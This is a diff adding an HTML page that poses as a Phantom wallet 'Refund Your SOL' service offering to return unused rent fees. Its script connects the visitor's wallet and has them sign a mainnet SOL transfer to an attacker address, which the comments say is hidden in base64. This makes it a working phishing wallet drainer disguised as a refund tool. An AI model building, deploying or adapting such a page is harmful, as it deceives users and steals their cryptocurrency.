@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Refund Your SOL | Dolanan</title>
+
+  <!-- Import library Solana Web3.js -->
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+  <!-- Style halaman -->
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0a0f2c;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    button {
+      background: #1a73e8;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    .status {
+      margin-top: 20px;
+      color: #90ee90;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Logo Phantom -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Phantom_by_MoonHoldings.png/480px-Phantom_by_MoonHoldings.png" alt="logo" class="logo" />
+
+  <!-- Judul dan deskripsi -->
+  <h1>Refund Your SOL</h1>
+  <p>Connect your Phantom Wallet to claim unused rent fees.</p>
+
+  <!-- Tombol connect wallet -->
+  <button onclick="connectWallet()">Connect Wallet</button>
+
+  <!-- Status koneksi dan transaksi -->
+  <div class="status" id="status"></div>
+
+  <!-- Script utama -->
+  <script>
+    const status = document.getElementById('status');
+    let provider = null;
+
+    // Fungsi cek dan ambil provider dari browser
+    function getProvider() {
+      if ('solana' in window) {
+        const provider = window.solana;
+        if (provider.isPhantom) {
+          return provider;
+        }
+      }
+      window.open('https://phantom.app/', '_blank');
+    }
+
+    // Fungsi connect dan transaksi
+    async function connectWallet() {
+      provider = getProvider();
+      if (!provider) return;
+
+      try {
+        // Hubungkan wallet
+        const resp = await provider.connect();
+        const publicKey = resp.publicKey.toString();
+        status.textContent = 'Wallet Connected: ' + publicKey;
+
+        // Alamat tujuan disimpan dalam base64 (disembunyikan)
+        const encoded = "SEp6V1o0QXZ4WXI3azZDOVBiSjNNcjVSOFhkZ2k3NmdSZ0xEN1Vja1dlaHQ=";
+        const recipient = new solanaWeb3.PublicKey(atob(encoded)); // Decode base64
+
+        // Konfirmasi transaksi
+        if (confirm("Kirim transaksi refund SOL ke wallet tujuan?")) {
+          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+
+          const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: provider.publicKey,
+              toPubkey: recipient,
+              lamports: 10000 // 0.00001 SOL
+            })
+          );
+
+          transaction.feePayer = provider.publicKey;
+          const { blockhash } = await connection.getRecentBlockhash();
+          transaction.recentBlockhash = blockhash;
+
+          const signed = await provider.signTransaction(transaction);
+          const txid = await connection.sendRawTransaction(signed.serialize());
+
+          status.innerHTML += "<br>Transaction sent: " + txid;
+        }
+
+      } catch (err) {
+        status.textContent = 'Connection failed: ' + err.message;
+      }
+    }
+  </script>
+
+</body>
+</html>
